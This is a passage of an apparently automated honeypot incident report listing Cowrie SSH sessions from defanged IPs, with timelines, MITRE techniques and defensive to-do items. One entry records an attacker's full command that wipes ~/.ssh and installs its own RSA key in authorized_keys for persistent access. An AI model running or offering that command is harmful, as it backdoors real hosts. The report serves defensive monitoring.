| `2026-08-05 06:22:01` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:22:01` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]103` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-009a2e549c22

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]240` |
| **First Seen** | 2026-08-05 06:22 |
| **Last Seen** | 2026-08-05 06:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:22:59` | `cowrie.session.connect` |
| `2026-08-05 06:23:00` | `cowrie.client.version` |
| `2026-08-05 06:23:00` | `cowrie.client.kex` |
| `2026-08-05 06:23:02` | `cowrie.login.success` |
| `2026-08-05 06:23:02` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]240` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53a28dc65b88

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 06:23 |
| **Last Seen** | 2026-08-05 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:23:08` | `cowrie.session.connect` |
| `2026-08-05 06:23:08` | `cowrie.client.version` |
| `2026-08-05 06:23:08` | `cowrie.client.kex` |
| `2026-08-05 06:23:08` | `cowrie.login.success` |
| `2026-08-05 06:23:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b328f736d60

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 06:23 |
| **Last Seen** | 2026-08-05 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:23:08` | `cowrie.session.connect` |
| `2026-08-05 06:23:08` | `cowrie.client.version` |
| `2026-08-05 06:23:08` | `cowrie.client.kex` |
| `2026-08-05 06:23:08` | `cowrie.login.success` |
| `2026-08-05 06:23:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3907890e941

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 06:23 |
| **Last Seen** | 2026-08-05 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:23:13` | `cowrie.session.connect` |
| `2026-08-05 06:23:13` | `cowrie.client.version` |
| `2026-08-05 06:23:13` | `cowrie.client.kex` |
| `2026-08-05 06:23:13` | `cowrie.login.success` |
| `2026-08-05 06:23:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5365e4b49145

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 06:23 |
| **Last Seen** | 2026-08-05 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:23:13` | `cowrie.session.connect` |
| `2026-08-05 06:23:13` | `cowrie.client.version` |
| `2026-08-05 06:23:13` | `cowrie.client.kex` |
| `2026-08-05 06:23:13` | `cowrie.login.success` |
| `2026-08-05 06:23:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dad9aa833ec

| Field | Detail |
|---|---|
| **Source IP** | `116.181.19[.]157` |
| **First Seen** | 2026-08-05 06:23 |
| **Last Seen** | 2026-08-05 06:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:23:49` | `cowrie.session.connect` |
| `2026-08-05 06:23:49` | `cowrie.client.version` |
| `2026-08-05 06:23:49` | `cowrie.client.kex` |
| `2026-08-05 06:23:50` | `cowrie.login.success` |
| `2026-08-05 06:23:51` | `cowrie.session.params` |
| `2026-08-05 06:23:51` | `cowrie.command.input` |
| `2026-08-05 06:23:51` | `cowrie.command.failed` |
| `2026-08-05 06:23:52` | `cowrie.log.closed` |
| `2026-08-05 06:23:53` | `cowrie.session.params` |
| `2026-08-05 06:23:53` | `cowrie.command.input` |
| `2026-08-05 06:23:53` | `cowrie.session.file_download` |
| `2026-08-05 06:23:53` | `cowrie.log.closed` |
| `2026-08-05 06:23:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.181.19[.]157` to AbuseIPDB if not already reported
- [ ] Block `116.181.19[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f36792b57162

| Field | Detail |
|---|---|
| **Source IP** | `116.181.19[.]157` |
| **First Seen** | 2026-08-05 06:23 |
| **Last Seen** | 2026-08-05 06:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:23:53` | `cowrie.session.connect` |
| `2026-08-05 06:23:53` | `cowrie.client.version` |
| `2026-08-05 06:23:54` | `cowrie.client.kex` |
| `2026-08-05 06:23:55` | `cowrie.login.success` |
| `2026-08-05 06:23:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.181.19[.]157` to AbuseIPDB if not already reported
- [ ] Block `116.181.19[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8a200342cd7

| Field | Detail |
|---|---|
| **Source IP** | `116.181.19[.]157` |
| **First Seen** | 2026-08-05 06:23 |
| **Last Seen** | 2026-08-05 06:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:23:55` | `cowrie.session.connect` |
| `2026-08-05 06:23:55` | `cowrie.client.version` |
| `2026-08-05 06:23:56` | `cowrie.client.kex` |
| `2026-08-05 06:23:57` | `cowrie.login.success` |
| `2026-08-05 06:23:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.181.19[.]157` to AbuseIPDB if not already reported
- [ ] Block `116.181.19[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff56ff50fc21

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-05 06:24 |
| **Last Seen** | 2026-08-05 06:24 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:24:22` | `cowrie.session.connect` |
| `2026-08-05 06:24:23` | `cowrie.login.success` |
| `2026-08-05 06:24:23` | `cowrie.session.params` |
| `2026-08-05 06:24:24` | `cowrie.command.input` |
| `2026-08-05 06:24:24` | `cowrie.command.failed` |
| `2026-08-05 06:24:24` | `cowrie.command.input` |
| `2026-08-05 06:24:24` | `cowrie.command.failed` |
| `2026-08-05 06:24:25` | `cowrie.command.input` |
| `2026-08-05 06:24:25` | `cowrie.command.failed` |
| `2026-08-05 06:24:25` | `cowrie.command.input` |
| `2026-08-05 06:24:25` | `cowrie.command.failed` |
| `2026-08-05 06:24:25` | `cowrie.command.input` |
| `2026-08-05 06:24:25` | `cowrie.command.input` |
| `2026-08-05 06:24:25` | `cowrie.command.failed` |
| `2026-08-05 06:24:25` | `cowrie.command.failed` |
| `2026-08-05 06:24:56` | `cowrie.log.closed` |
| `2026-08-05 06:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cd81074a980

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-05 06:24 |
| **Last Seen** | 2026-08-05 06:25 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:24:56` | `cowrie.session.connect` |
| `2026-08-05 06:24:57` | `cowrie.login.success` |
| `2026-08-05 06:24:57` | `cowrie.session.params` |
| `2026-08-05 06:24:58` | `cowrie.command.input` |
| `2026-08-05 06:24:58` | `cowrie.command.failed` |
| `2026-08-05 06:24:58` | `cowrie.command.input` |
| `2026-08-05 06:24:58` | `cowrie.command.failed` |
| `2026-08-05 06:24:58` | `cowrie.command.input` |
| `2026-08-05 06:24:58` | `cowrie.command.failed` |
| `2026-08-05 06:24:59` | `cowrie.command.input` |
| `2026-08-05 06:24:59` | `cowrie.command.failed` |
| `2026-08-05 06:24:59` | `cowrie.command.input` |
| `2026-08-05 06:24:59` | `cowrie.command.input` |
| `2026-08-05 06:24:59` | `cowrie.command.failed` |
| `2026-08-05 06:24:59` | `cowrie.command.failed` |
| `2026-08-05 06:25:30` | `cowrie.log.closed` |
| `2026-08-05 06:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d31401793cd

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-05 06:25 |
| **Last Seen** | 2026-08-05 06:26 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:25:30` | `cowrie.session.connect` |
| `2026-08-05 06:25:31` | `cowrie.login.success` |
| `2026-08-05 06:25:31` | `cowrie.session.params` |
| `2026-08-05 06:25:32` | `cowrie.command.input` |
| `2026-08-05 06:25:32` | `cowrie.command.failed` |
| `2026-08-05 06:25:32` | `cowrie.command.input` |
| `2026-08-05 06:25:32` | `cowrie.command.failed` |
| `2026-08-05 06:25:33` | `cowrie.command.input` |
| `2026-08-05 06:25:33` | `cowrie.command.failed` |
| `2026-08-05 06:25:33` | `cowrie.command.input` |
| `2026-08-05 06:25:33` | `cowrie.command.failed` |
| `2026-08-05 06:25:33` | `cowrie.command.input` |
| `2026-08-05 06:25:33` | `cowrie.command.input` |
| `2026-08-05 06:25:33` | `cowrie.command.failed` |
| `2026-08-05 06:25:33` | `cowrie.command.failed` |
| `2026-08-05 06:26:04` | `cowrie.log.closed` |
| `2026-08-05 06:26:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7052f0b3d069

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-05 06:26 |
| **Last Seen** | 2026-08-05 06:26 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:26:04` | `cowrie.session.connect` |
| `2026-08-05 06:26:05` | `cowrie.login.success` |
| `2026-08-05 06:26:05` | `cowrie.session.params` |
| `2026-08-05 06:26:06` | `cowrie.command.input` |
| `2026-08-05 06:26:06` | `cowrie.command.failed` |
| `2026-08-05 06:26:06` | `cowrie.command.input` |
| `2026-08-05 06:26:06` | `cowrie.command.failed` |
| `2026-08-05 06:26:06` | `cowrie.command.input` |
| `2026-08-05 06:26:06` | `cowrie.command.failed` |
| `2026-08-05 06:26:06` | `cowrie.command.input` |
| `2026-08-05 06:26:06` | `cowrie.command.failed` |
| `2026-08-05 06:26:07` | `cowrie.command.input` |
| `2026-08-05 06:26:07` | `cowrie.command.input` |
| `2026-08-05 06:26:07` | `cowrie.command.failed` |
| `2026-08-05 06:26:07` | `cowrie.command.failed` |
| `2026-08-05 06:26:38` | `cowrie.log.closed` |
| `2026-08-05 06:26:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9956eb9b02d2

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]227` |
| **First Seen** | 2026-08-05 06:26 |
| **Last Seen** | 2026-08-05 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:26:09` | `cowrie.session.connect` |
| `2026-08-05 06:26:09` | `cowrie.client.version` |
| `2026-08-05 06:26:09` | `cowrie.client.kex` |
| `2026-08-05 06:26:09` | `cowrie.login.success` |
| `2026-08-05 06:26:10` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:26:10` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]227` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]227` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b45728ec8502

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-05 06:26 |
| **Last Seen** | 2026-08-05 06:27 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:26:38` | `cowrie.session.connect` |
| `2026-08-05 06:26:39` | `cowrie.login.success` |
| `2026-08-05 06:26:40` | `cowrie.login.success` |
| `2026-08-05 06:26:40` | `cowrie.session.params` |
| `2026-08-05 06:26:40` | `cowrie.command.input` |
| `2026-08-05 06:26:40` | `cowrie.command.failed` |
| `2026-08-05 06:26:41` | `cowrie.command.input` |
| `2026-08-05 06:26:41` | `cowrie.command.failed` |
| `2026-08-05 06:26:41` | `cowrie.command.input` |
| `2026-08-05 06:26:41` | `cowrie.command.input` |
| `2026-08-05 06:26:41` | `cowrie.command.failed` |
| `2026-08-05 06:26:41` | `cowrie.command.failed` |
| `2026-08-05 06:27:12` | `cowrie.log.closed` |
| `2026-08-05 06:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a961c352e30

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-05 06:27 |
| **Last Seen** | 2026-08-05 06:27 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:27:12` | `cowrie.session.connect` |
| `2026-08-05 06:27:13` | `cowrie.login.success` |
| `2026-08-05 06:27:13` | `cowrie.session.params` |
| `2026-08-05 06:27:14` | `cowrie.command.input` |
| `2026-08-05 06:27:14` | `cowrie.command.failed` |
| `2026-08-05 06:27:14` | `cowrie.command.input` |
| `2026-08-05 06:27:14` | `cowrie.command.failed` |
| `2026-08-05 06:27:15` | `cowrie.command.input` |
| `2026-08-05 06:27:15` | `cowrie.command.failed` |
| `2026-08-05 06:27:15` | `cowrie.command.input` |
| `2026-08-05 06:27:15` | `cowrie.command.failed` |
| `2026-08-05 06:27:15` | `cowrie.command.input` |
| `2026-08-05 06:27:15` | `cowrie.command.input` |
| `2026-08-05 06:27:15` | `cowrie.command.failed` |
| `2026-08-05 06:27:15` | `cowrie.command.failed` |
| `2026-08-05 06:27:46` | `cowrie.log.closed` |
| `2026-08-05 06:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6fcfac5e550

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-05 06:27 |
| **Last Seen** | 2026-08-05 06:28 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:27:46` | `cowrie.session.connect` |
| `2026-08-05 06:27:47` | `cowrie.login.success` |
| `2026-08-05 06:27:47` | `cowrie.session.params` |
| `2026-08-05 06:27:48` | `cowrie.command.input` |
| `2026-08-05 06:27:48` | `cowrie.command.failed` |
| `2026-08-05 06:27:48` | `cowrie.command.input` |
| `2026-08-05 06:27:48` | `cowrie.command.failed` |
| `2026-08-05 06:27:48` | `cowrie.command.input` |
| `2026-08-05 06:27:48` | `cowrie.command.failed` |
| `2026-08-05 06:27:48` | `cowrie.command.input` |
| `2026-08-05 06:27:48` | `cowrie.command.failed` |
| `2026-08-05 06:27:49` | `cowrie.command.input` |
| `2026-08-05 06:27:49` | `cowrie.command.input` |
| `2026-08-05 06:27:49` | `cowrie.command.failed` |
| `2026-08-05 06:27:49` | `cowrie.command.failed` |
| `2026-08-05 06:28:20` | `cowrie.log.closed` |
| `2026-08-05 06:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26a5effbe672

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-05 06:28 |
| **Last Seen** | 2026-08-05 06:28 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:28:20` | `cowrie.session.connect` |
| `2026-08-05 06:28:21` | `cowrie.login.success` |
| `2026-08-05 06:28:21` | `cowrie.session.params` |
| `2026-08-05 06:28:22` | `cowrie.command.input` |
| `2026-08-05 06:28:22` | `cowrie.command.failed` |
| `2026-08-05 06:28:22` | `cowrie.command.input` |
| `2026-08-05 06:28:22` | `cowrie.command.failed` |
| `2026-08-05 06:28:23` | `cowrie.command.input` |
| `2026-08-05 06:28:23` | `cowrie.command.failed` |
| `2026-08-05 06:28:23` | `cowrie.command.input` |
| `2026-08-05 06:28:23` | `cowrie.command.failed` |
| `2026-08-05 06:28:23` | `cowrie.command.input` |
| `2026-08-05 06:28:23` | `cowrie.command.input` |
| `2026-08-05 06:28:23` | `cowrie.command.failed` |
| `2026-08-05 06:28:23` | `cowrie.command.failed` |
| `2026-08-05 06:28:54` | `cowrie.log.closed` |
| `2026-08-05 06:28:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08011929f105

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-05 06:28 |
| **Last Seen** | 2026-08-05 06:29 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:28:54` | `cowrie.session.connect` |
| `2026-08-05 06:28:55` | `cowrie.login.failed` |
| `2026-08-05 06:28:56` | `cowrie.login.success` |
| `2026-08-05 06:28:56` | `cowrie.session.params` |
| `2026-08-05 06:28:57` | `cowrie.command.input` |
| `2026-08-05 06:28:57` | `cowrie.command.failed` |
| `2026-08-05 06:28:57` | `cowrie.command.input` |
| `2026-08-05 06:28:57` | `cowrie.command.failed` |
| `2026-08-05 06:28:57` | `cowrie.command.input` |
| `2026-08-05 06:28:57` | `cowrie.command.input` |
| `2026-08-05 06:28:57` | `cowrie.command.failed` |
| `2026-08-05 06:28:57` | `cowrie.command.failed` |
| `2026-08-05 06:29:28` | `cowrie.log.closed` |
| `2026-08-05 06:29:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59d983864b87

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-05 06:29 |
| **Last Seen** | 2026-08-05 06:30 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:29:28` | `cowrie.session.connect` |
| `2026-08-05 06:29:29` | `cowrie.login.success` |
| `2026-08-05 06:29:29` | `cowrie.session.params` |
| `2026-08-05 06:29:30` | `cowrie.command.input` |
| `2026-08-05 06:29:30` | `cowrie.command.failed` |
| `2026-08-05 06:29:30` | `cowrie.command.input` |
| `2026-08-05 06:29:30` | `cowrie.command.failed` |
| `2026-08-05 06:29:31` | `cowrie.command.input` |
| `2026-08-05 06:29:31` | `cowrie.command.failed` |
| `2026-08-05 06:29:31` | `cowrie.command.input` |
| `2026-08-05 06:29:31` | `cowrie.command.failed` |
| `2026-08-05 06:29:31` | `cowrie.command.input` |
| `2026-08-05 06:29:31` | `cowrie.command.input` |
| `2026-08-05 06:29:31` | `cowrie.command.failed` |
| `2026-08-05 06:29:31` | `cowrie.command.failed` |
| `2026-08-05 06:30:02` | `cowrie.log.closed` |
| `2026-08-05 06:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f84bb9f79b96

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-08-05 06:29 |
| **Last Seen** | 2026-08-05 06:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:29:41` | `cowrie.session.connect` |
| `2026-08-05 06:29:41` | `cowrie.client.version` |
| `2026-08-05 06:29:41` | `cowrie.client.kex` |
| `2026-08-05 06:29:42` | `cowrie.login.success` |
| `2026-08-05 06:29:42` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9ecfb5e62cc

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]29` |
| **First Seen** | 2026-08-05 06:34 |
| **Last Seen** | 2026-08-05 06:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:34:59` | `cowrie.session.connect` |
| `2026-08-05 06:34:59` | `cowrie.client.version` |
| `2026-08-05 06:34:59` | `cowrie.client.kex` |
| `2026-08-05 06:34:59` | `cowrie.login.success` |
| `2026-08-05 06:34:59` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:35:00` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]29` to AbuseIPDB if not already reported
